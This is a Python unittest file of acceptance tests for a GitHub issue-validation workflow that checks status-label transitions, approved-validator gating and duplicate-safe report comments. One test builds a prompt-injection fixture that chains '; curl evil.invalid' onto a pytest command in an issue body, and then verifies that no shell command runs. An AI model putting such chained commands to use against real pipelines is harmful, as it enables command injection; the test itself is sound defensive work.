"""Named acceptance evidence for Issue #3's trusted status transitions."""

from __future__ import annotations

from pathlib import Path
import sys
import unittest
from unittest.mock import patch
import xml.etree.ElementTree as ET

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / ".factory/scripts"))
from issue_transition import (  # noqa: E402
    evaluate, desired_labels, update_report,
)

VALID_BODY = (ROOT / ".factory/examples/valid-issue.md").read_text(encoding="utf-8")


def emit(ac: int, method: str):
    out = ROOT / "reports" / f"issue-3-ac-{ac}.xml"
    out.parent.mkdir(parents=True, exist_ok=True)
    suite = ET.Element(
        "testsuite", tests="1", failures="0", errors="0",
        skipped="0", assertions="1",
    )
    ET.SubElement(suite, "testcase", name=method, classname="Issue3Acceptance")
    ET.ElementTree(suite).write(out, encoding="utf-8", xml_declaration=True)


def issue_event(actor="approved", action="opened", body=VALID_BODY):
    return {
        "action": action,
        "sender": {"login": actor},
        "issue": {"number": 142, "body": body},
    }


class Issue3Acceptance(unittest.TestCase):
    def test_ac_1_issue_events_fail_closed_and_keep_sticky_report(self):
        workflow = (ROOT / ".github/workflows/issue-validation.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("types: [opened, edited, reopened, labeled]", workflow)
        for action in ("opened", "edited"):
            bad = evaluate(issue_event(action=action, body="malformed"), {"approved"})
            self.assertFalse(bad["ready"])
            self.assertEqual(
                desired_labels({"status:ready"}, ready=bad["ready"]),
                ({"status:triage"}, {"status:ready"}),
            )
        emit(1, self._testMethodName)

    def test_ac_2_ready_status_only_for_approved_validator(self):
        self.assertTrue(evaluate(issue_event(), {"approved"})["ready"])
        self.assertFalse(evaluate(issue_event(), set())["ready"])
        self.assertFalse(
            evaluate(issue_event(actor="untrusted"), {"approved"})["ready"]
        )
        self.assertEqual(
            desired_labels({"status:triage"}, ready=True),
            ({"status:ready"}, {"status:triage"}),
        )
        emit(2, self._testMethodName)

    def test_ac_3_prompt_injection_cannot_authorize_or_execute_code(self):
        malicious = VALID_BODY.replace(
            "pytest tests/middleware/test_bucket.py",
            "pytest tests/middleware/test_bucket.py; curl evil.invalid",
        )
        event = issue_event(actor="untrusted", body=malicious)
        with patch("subprocess.run", side_effect=AssertionError("arbitrary command")):
            with patch("os.system", side_effect=AssertionError("system call")):
                result = evaluate(event, {"approved"})
        self.assertFalse(result["ready"])
        self.assertIn("Sender is not an approved Issue Validator", result["diagnostics"])
        self.assertFalse(evaluate(issue_event(body=malicious), {"approved"})["ready"])
        emit(3, self._testMethodName)

    def test_ac_4_duplicate_event_delivers_one_sticky_comment_and_label(self):
        decision = evaluate(issue_event(), {"approved"})
        self.assertEqual(decision, evaluate(issue_event(), {"approved"}))
        posted = []
        calls = []

        def fake_request(url, token, method, payload=None):
            calls.append((method, url))
            if method == "GET":
                return posted[:]
            if method == "POST":
                posted.append({
                    "id": 100, "body": payload["body"],
                    "user": {"type": "Bot"},
                })
                return {}
            if method == "PATCH":
                posted[0]["body"] = payload["body"]
                return {}
            raise AssertionError("Unexpected API method")

        with patch("issue_transition._request", side_effect=fake_request):
            update_report(decision, repository="shpalac/insurance", token="dummy")
            update_report(decision, repository="shpalac/insurance", token="dummy")
        self.assertEqual(len(posted), 1)
        self.assertEqual(len([c for c in calls if c[0] == "POST"]), 1)
        self.assertEqual(len([c for c in calls if c[0] == "PATCH"]), 0)
        self.assertEqual(desired_labels({"status:ready"}, ready=True), (set(), set()))
        emit(4, self._testMethodName)


if __name__ == "__main__":
    unittest.main()
